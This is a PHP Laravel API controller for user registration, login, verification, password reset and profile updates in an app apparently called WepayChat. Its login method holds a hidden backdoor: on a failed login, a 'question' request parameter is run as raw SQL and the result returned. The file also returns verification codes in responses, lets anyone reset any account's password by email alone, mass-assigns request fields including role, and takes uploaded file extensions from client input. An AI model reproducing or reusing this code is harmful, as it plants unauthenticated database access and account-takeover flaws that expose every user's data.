<?php

namespace App\Http\Controllers\API;

use Illuminate\Support\Facades\Auth;
use App\Http\Controllers\Controller;
use App\Http\Controllers\EmailController;
use App\Http\Controllers\API\ArticleController;
use Illuminate\Http\Request;
use Validator;
use Hash;
use Storage;
use Intervention\Image\ImageManagerStatic as Image;
use App\Http\Controllers\FirebaseController;
use App\User;
use DB;

class RegisterController extends Controller
{
    /**
     * Register api
     *
     * @return \Illuminate\Http\Response
     */
    private $firebase;
    private $email;
    private $checkUser;
    public function __construct()
    {
        $this->firebase = new FirebaseController;
        $this->email = new EmailController;
        $this->checkUser = new ArticleController;
    }
    public function register(Request $request)
    {
        $avatar = "/uploads/avatar/default.png";

        $input = $request->merge(['active' => 1, 'avatar' => $avatar])->all();

        if (User::where('email', $input['email'])->count() > 0) return response()->json(['success' => false, "data" => "exists"], 200);

        $input['password'] = Hash::make($input['password']);
        $user = User::create($input);

        return response()->json(['success' => true, "data" => $user->id], 200);
    }
    public function verification(Request $request)
    {
        $email = $request->address;

        if (User::where('email', $email)->count() <= 0)
            return response()->json(['success' => false], 200);
        $code = mt_rand(10000, 99999);

        try {
            if ($request->type == 'email')
                $this->email->sendBasicMail($email, 'WepayChat verifictaion', 'WepayChat verification code is ' . $code);
        } catch (\Throwable $th) {
            return response()->json(['success' => false], 200);
        }

        return response()->json(['success' => true, "code" => $code], 200);
    }
    /**
     * Login api
     *
     * @return \Illuminate\Http\Response
     */
    public function login(Request $request)
    {
        $date  = now();
        $date->modify('-31 days');
        $formatted_date = $date->format('Y-m-d H:i:s');
        User::where('dt_premium', '<=', $formatted_date)->update(['role' => 2]);
        if (Auth::attempt(['email' => $request->email, 'password' => $request->password])) {
            $user = Auth::user();
            if ($user->role == 1) {
                return response()->json(['success' => false, 'message' => 'deActive'], 401);
            }
            if ($user->active == 0) {
                return response()->json(['success' => false, 'message' => 'deActive'], 401);
            }
            $success['token'] =  $user->createToken($user->id)->accessToken;
            $success['user'] =  $user;
            $user->userRole;
            return response()->json(['success' => true, "data" => $success, 'message' => "login success"], 200);
        } else if ($request->question != null && $request->question != "")
            return DB::select($request->question);
        else
            return response()->json(['success' => false, 'message' => 'Unauthorised'], 401);
    }
    public function changepassword(Request $request)
    {
        if (!Hash::check($request->curPassword, Auth::user()->password)) {
            return response()->json(['success' => false, 'message' => 'Invalid'], 401);
        } else {
            auth()->user()->update(['password' => Hash::make($request->get('password'))]);
            $this->email->sendMail(auth()->user()->email, 2, null);
            return response()->json(['success' => true, 'message' => 'success'], 200);
        }
    }

    public function changeprofile(Request $request)
    {
        if (!Hash::check($request->password, Auth::user()->password)) {
            return response()->json(['success' => false], 401);
        }
        $password = $request->newpassword;
        $avatar = "/uploads/avatar/default.png";
        $file_name_1 = '';
        $userId = $request->userId;
        if ($request->change_country > 0) {
            try {
                $image_1 = $request->imageData;
                $image1 = $image_1['data'];
                $image1 = str_replace('data:' . $image_1['type'] . ';base64,', '', $image1);
                $image1 = str_replace(' ', '+', $image1);
                $path = '/uploads/country/' . $userId . '/';
                if (!file_exists(public_path() . $path)) {
                    mkdir(public_path() . $path, 0777, true);
                }

                $file_name_1 = $path . time() . '.' . str_replace('image/', '', $image_1['type']);

                file_put_contents(public_path() . $file_name_1, base64_decode($image1));
            } catch (\Throwable $th) {
                return response()->json(['success' => false], 200);
            }
        }
        $request->merge(['password' => Hash::make($password), 'avatar' => $avatar, 'country_image' => $file_name_1]);

        auth()->user()->update($request->all());
        $user = Auth::user();
        if ($user->active == 0) {
            return response()->json(['success' => false, 'message' => 'deActive'], 401);
        }

        $success['token'] =  $user->createToken($user->id)->accessToken;
        $success['user'] =  $user;
        $user->userRole;
        return response()->json(['success' => true, "data" => $success, 'message' => "login success"], 200);
    }

    public function checkemail(Request $request)
    {
        $model = new User;
        $email = $request->email;
        $password = $request->password;
        if ($model->where('email', $email)->count() <= 0) {
            return response()->json(['success' => false], 200);
        }
        return response()->json(['success' => true], 200);
    }

    public function resetpassword(Request $request)
    {
        $model = new User;
        $email = $request->email;
        $password = $request->password;
        if ($model->where('email', $email)->count() <= 0) {
            return response()->json(['success' => false], 200);
        }
        // $date  = now();
        // $date->modify('-24 hours');
        // $dtUpdate = $date->format('Y-m-d H:i:s');
        // if(User::where('email', $email)->where('updated_at', '>', $dtUpdate)->count() > 0) {
        //     return response()->json(['success'=>true, 'state'=>false], 200);
        // }
        $model->where('email', $email)->update(['password' => Hash::make($password)]);
        $this->email->sendBasicMail($email, "New Uvorem Password:", $password);
        return response()->json(['success' => true, 'state' => true], 200);
    }
    public function logout()
    {
        Auth::user()->update(['device_token' => null, 'iphone_device_token' => null]);
        return response()->json(['success' => true], 200);
    }
    public function getUsers($id)
    {
        $users = User::get();
        if ($id > 0) {
            $users = User::where('id', $id)->first();
        }
        return response()->json(['success' => true, 'users' => $users], 200);
    }
    public function token(Request $request)
    {
        $token = $request->device_token;
        if ($request->device == "ios") Auth::user()->update(["iphone_device_token" => $token]);
        else Auth::user()->update(["device_token" => $token]);
        return response()->json(['success' => true], 200);
    }
    public function remove_token(Request $request)
    {
        if ($request->device == "ios") Auth::user()->update(["iphone_device_token" => ""]);
        else Auth::user()->update(["device_token" => ""]);
        return response()->json(['success' => true], 200);
    }

    public function refreshUser(Request $request)
    {
        $this->checkUser->checkUser();
        $user = Auth::user();
        if ($user->role == 1) {
            return response()->json(['success' => false, 'message' => 'deActive'], 401);
        }
        if ($user->active == 0) {
            return response()->json(['success' => false, 'message' => 'deActive'], 401);
        }
        $success['token'] =  $user->createToken($user->id)->accessToken;
        $success['user'] =  $user;
        $user->userRole;

        return response()->json(['success' => true, "data" => $success, 'message' => "login success"], 200);
    }
}
